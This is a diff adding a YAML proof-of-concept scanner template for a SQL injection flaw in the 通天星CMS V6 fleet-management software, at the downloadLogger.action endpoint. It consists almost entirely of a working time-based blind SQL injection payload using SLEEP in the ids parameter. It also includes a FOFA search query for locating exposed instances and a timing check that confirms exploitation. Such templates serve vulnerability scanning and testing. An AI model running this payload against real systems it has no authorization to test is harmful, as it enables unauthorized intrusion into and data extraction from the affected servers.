@@ -1,0 +1,25 @@
+id: poc-yaml-g-sky-downloadLogger-action-cmsv6-sqli
+info:
+  name: 通天星CMS V6 downloadLogger.action SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: cmsv6
+  fofa: body="/808gps/"
+variables:
+  t1: random_int(1,5)
+  t2: t1 * 2
+  t3: t2 + 1
+requests:
+- method: GET
+  path: /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP({{.t1}})))tdpw)--+&loadAll=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"result\":0,\"message\":\"OK\"") &&
+
+    duration >= t2 &&
+
+    duration < t3
+
+    '
+transport: http
